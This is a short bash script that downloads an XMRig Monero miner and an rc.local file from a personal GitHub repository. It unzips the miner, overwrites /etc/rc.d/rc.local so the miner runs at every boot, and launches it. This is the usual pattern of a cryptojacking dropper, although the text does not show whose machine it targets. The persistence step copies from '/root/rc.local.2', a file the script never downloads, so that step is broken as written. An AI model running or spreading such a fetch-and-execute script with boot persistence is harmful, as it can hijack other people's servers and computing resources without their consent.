#!/bin/bash
wget https://raw.githubusercontent.com/zy123456-zhong/mycode/master/xmrig-5.5.3.zip
wget https://raw.githubusercontent.com/zy123456-zhong/mycode/master/rc.local
unzip xmrig-5.5.3.zip
cat /root/rc.local.2 > /etc/rc.d/rc.local 
chmod +x /etc/rc.d/rc.local
chmod +x xmrig-5.5.3/xmrig
./xmrig-5.5.3/xmrig

